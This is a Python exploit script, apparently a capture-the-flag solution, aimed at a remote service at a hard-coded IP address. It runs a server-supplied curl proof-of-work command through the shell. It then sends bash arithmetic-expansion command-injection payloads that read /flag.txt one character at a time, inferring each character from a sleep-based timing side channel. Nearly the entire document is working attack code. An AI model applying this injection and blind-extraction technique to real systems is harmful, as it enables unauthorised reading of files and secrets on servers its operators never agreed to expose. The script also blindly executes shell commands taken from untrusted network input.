import socket
import subprocess
import time
import string
import re

HOST = "35.245.30.212"
PORT = 5000

SLEEP_TIME = 3
THRESHOLD = 2.0
MAX_RETRIES = 5

CHARSET = "_-?!@#$%^&*()[]{}<>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
KNOWN_PREFIX = "uoftctf{"

flag = KNOWN_PREFIX


def recv_until(sock, marker: bytes, timeout=10):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data.decode(errors="ignore")


def solve_pow(banner: str):
    m = re.search(r"(curl .*pwn\.red/pow.*)", banner)
    if not m:
        return None

    pow_cmd = m.group(1)

    try:
        out = subprocess.check_output(
            pow_cmd,
            shell=True,
            stderr=subprocess.DEVNULL,
            timeout=20
        ).decode().strip()
        return out if out else None
    except Exception:
        return None


def test_char(position: int, ch: str) -> bool:
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            s = socket.socket()
            s.settimeout(15)
            s.connect((HOST, PORT))

            banner = recv_until(s, b"solution:")
            solution = solve_pow(banner)

            if not solution:
                print("    [!] PoW failed, retrying...")
                s.close()
                continue

            s.sendall((solution + "\n").encode())
            recv_until(s, b"(hex):")

            payload = (
                f"0 + a[$("
                f"if [ \"$(head -c {position} /flag.txt | tail -c 1)\" = \"{ch}\" ]; "
                f"then sleep {SLEEP_TIME}; fi"
                f")]\n"
            )

            start = time.time()
            s.sendall(payload.encode())
            s.recv(1024)
            elapsed = time.time() - start
            s.close()

            return elapsed > THRESHOLD

        except Exception as e:
            print(f"    [!] Connection error ({attempt}/{MAX_RETRIES}), retrying...")
            try:
                s.close()
            except:
                pass
            time.sleep(1)

    return False


print("\n[*] Starting robust blind extraction")
print(f"[+] Known prefix: {flag}\n")

pos = len(flag) + 1

while True:
    found = False

    for ch in CHARSET:
        print(f"[*] Testing position {pos} → '{ch}' | Current flag: {flag}")
        if test_char(pos, ch):
            flag += ch
            print(f"\n[+] CONFIRMED → {flag}\n")
            found = True
            break

    if not found:
        print("[-] No character matched after retries. Stopping safely.")
        break

    if ch == "}":
        print("\n[+] Flag fully recovered!")
        break

    pos += 1
